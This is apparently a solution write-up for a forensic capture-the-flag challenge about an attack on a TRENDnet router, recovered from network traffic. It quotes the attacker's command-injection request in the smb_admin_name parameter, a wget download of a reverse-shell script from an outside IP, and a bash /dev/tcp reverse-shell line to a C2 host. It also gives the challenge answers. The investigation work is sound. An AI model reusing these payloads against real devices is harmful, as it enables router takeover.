Machine:Trent | Creator:a1l4m

Sherlock Scenario
The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation. You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker's Techniques, Tactics, and Procedures (TTPs).

Questions:
From what IP address did the attacker initially launched their activity?
    This was clear from the brute force and packets that request the webpage from the router.
    [192.168.10.2]


What is the model name of the compromised router?
    Noticable from the first TCP stream (0)
    [TEW-827DRU]


How many failed login attempts did the attacker try before successfully logging into the router?
    This can be visualised with http.request.method == "POST" && ip.src == 192.168.10.2. The first two TCP streams return the login page. The 3rd attempt loads the router configs.
    [2]


At what UTC time did the attacker successfully log into the routers web admin interface?
    This is the packet in response to our third successful packet. (HTTP/1.1 200 OK)
    [2024-05-01 15:53:27]

Task 5

How many characters long was the password used to log in successfully?
    Payload from the 3rd successful packet:
    HTML Form URL Encoded: application/x-www-form-urlencoded
        Form item: "html_response_page" = "/login_pic.asp"
        Form item: "login_name" = "YWRtaW4="
        Form item: "log_pass" = ""
        Form item: "action" = "do_graph_auth"
        Form item: "login_n" = "admin"
        Form item: "tmp_log_pass" = ""
        Form item: "graph_code" = ""
        Form item: "session_id" = "4152"
    [0]

Task 6

What is the current firmware version installed on the compromised router?
    <!-- ----------------- System Info ----------------- -->
    											<tr>
    												<td class="CL"><script>show_words('sd_FWV');</script></td>
    												<td class="CR"><span id="fwVer">2.10 , 11, Jan, 2022</s
    [2.10]


Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?
This is the next POST parameter after the attacker has been successful, in which we filter the query again with http.request.method == "POST" && ip.src == 192.168.10.2
ccp_act=set&html_response_return_page=smbserver.asp&action=samba36&usbapps.config.smb_admin_pass=admin&usbapps.config.smb_admin_name=admin`whoami`&usbapps.config.smb_enable=1&samba.@samba[0].name=USBSHARE&samba.@samba[0].workgroup=WORKGROUP&samba.@samba[0].description=&reboot_type=reboot&reboot_type=application&1714578957726=1714578957726
We can see the injection within the header.
[usbapps.config.smb_admin_name]


What is the CVE number associated with the vulnerability that was exploited in this attack?
    This we can lookup online since we can visualise the injection parameter and the device.
    [CVE-2024-28353]


What was the first command the attacker executed by exploiting the vulnerability?
    We can see this above with the inserted command:
    [whoami]


What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?
    Using another tool known as 'NetworkMiner', we are able to find the commands through the parameters tab extracting the http headers and commands.
    We also know that this is injected through the usbapps.config.smb_admin_name parameter value, we can filter specifically for it.
    [wget http://35.159.25.253:8000/a1l4m.sh]


Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?
    Using a combination of both the NetworkMiner and Wireshark, we are able to find the exact command packet with Frame Number in NetworkMiner, find the frame in wireshark using frame.number == ""
    From there, you can follow the tcp stream and find the response from the server which was:
    [Access to this resource is forbidden]


What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)
    This can be visualised in the response packet to the successful transfer where the router performs a GET request to gain access to the packet via the injected command.
    In the response we get 'bash -i > /dev /tcp/35.159.25.2 53/41143 0<&1 2> &1'
    [35.159.25.2:41143]
